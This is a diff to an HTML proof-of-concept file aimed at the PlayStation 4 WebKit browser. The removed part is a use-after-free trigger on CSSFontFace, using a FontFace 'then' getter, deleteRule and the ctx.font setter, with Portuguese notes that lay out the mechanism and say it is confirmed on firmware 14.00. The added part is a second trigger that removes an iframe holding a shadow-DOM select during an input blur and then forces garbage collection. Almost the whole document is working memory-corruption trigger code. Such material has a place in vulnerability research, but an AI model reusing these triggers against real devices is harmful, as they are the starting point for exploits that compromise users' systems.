@@ -1,64 +1,39 @@
-<!DOCTYPE html>
-<!--
-  UAF: CSSFontFace via ctx.font setter + deleteRule + layout
-  ===========================================================
-  Bug class  : Use-After-Free (CWE-416)
-  Target     : PS4 libSceNKWebKit.sprx / AppleWebKit 605.1.15
-  Trigger    : ctx.font = 'size FontName'
-  Victim C++ : CSSFontFace — objeto liberado por deleteRule()
-               enquanto font selection code segura raw pointer
-
-  MECANISMO:
-  ----------
-  1. <style id="v"> registra @font-face CSS para familia 'T'
-     → WebKit cria CSSFontFace C++ para esta regra
-  2. JS FontFace para mesma familia 'T' adicionado ao document.fonts
-  3. ctx.font = '10px T' → setFont() → CSSFontSelector::fontForFamily('T')
-     → ES2015 thenable check → [[Get]] FontFace.prototype.then
-  4. Getter dispara com CSSFontFace C++ referenciado na call stack
-  5. deleteRule(0) remove a regra CSS → CSSFontFace C++ destruido
-  6. document.body.offsetTop forca layout confirmando a destruicao
-  7. font selection code continua com raw pointer dangling → UAF → CRASH
-
-  DIFERENCA DO UAF_FontFace confirmado pela Sony:
-  -----------------------------------------------
-  Mesmo padrao de destruicao de CSSFontFace via CSS rule removal,
-  porem com trigger ctx.font setter (novo!) em vez de
-  document.fonts.load() / ctx.measureText().
-
-  CONFIRMADO: PS4 FW 14.00 — secao D V1 do diagnostico v4
--->
 <html>
 <head>
-<style id="v">@font-face { font-family: T; src: local(Helvetica); }</style>
+<script>
+function forceGC() {
+    function gcRec(n) {
+          if (n < 1)
+              return {};
+          var temp = {i: "ab" + i + (i / 100000)};
+          temp += "foo";
+          gcRec(n-1);
+    }
+    for (var i = 0; i < 10000; i++)
+    gcRec(10);
+}
+async function magic() {
+  frame.remove();
+  document.body.innerHTML = '<p>Select e iframe removidos sem crash.</p>';
+  forceGC();
+}
+</script>
 </head>
 <body>
+<p>Pressione <strong>Alt + A</strong> para acionar o access key.</p>
+<p>Se o browser n�o crashar e aparecer mensagem verde, o bug foi corrigido.</p>
 <script>
-function trigger() {
-    var face = new FontFace('T', 'local(Helvetica)');
-    document.fonts.add(face);
-    void face.loaded;
+  frame = document.body.appendChild(document.createElement('iframe'));
+  frame.style = 'width:100%; height:200px; border:0';
 
-    var fired = false;
-    Object.defineProperty(FontFace.prototype, 'then', {
-        configurable: true,
-        get: function() {
-            if (fired) return undefined;
-            fired = true;
-            var s = document.getElementById('v');
-            if (s && s.sheet && s.sheet.cssRules.length > 0) {
-                s.sheet.deleteRule(0);
-            }
-            void document.body.offsetTop;
-            return undefined;
-        }
-    });
+  outerContainer = frame.contentDocument.body.attachShadow({ mode: 'open' });
+  outerContainer.innerHTML = `<select accesskey="a"><option>SouthSea</option></select>
+<p>Made in the body</p>
+<input>`;
 
-    var c = document.createElement('canvas');
-    c.getContext('2d').font = '10px T';
-}
-
-window.onload = function() { setTimeout(trigger, 0); };
+  var input = outerContainer.querySelector('input');
+  input.addEventListener('blur', magic);
+  input.focus();
 </script>
 </body>
 </html>
